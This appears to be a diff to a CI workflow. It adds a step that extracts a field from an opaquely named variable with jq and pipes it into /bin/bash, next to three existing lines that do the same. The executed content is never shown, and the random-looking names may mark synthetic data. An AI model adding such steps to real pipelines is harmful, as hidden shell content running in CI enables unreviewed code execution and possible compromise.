@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$fuar3" | jq -r .cuh6416 | /bin/bash
           echo $ubyg50 | jq -r .sbbkk4034 | /bin/bash
           printf '%s' "$phnug9538" | jq -r .guoln878 | /bin/bash
+          printf '%s' "$c588" | jq -r .qsgs7525 | /bin/bash
 
       - name: Persist output
         if: always()
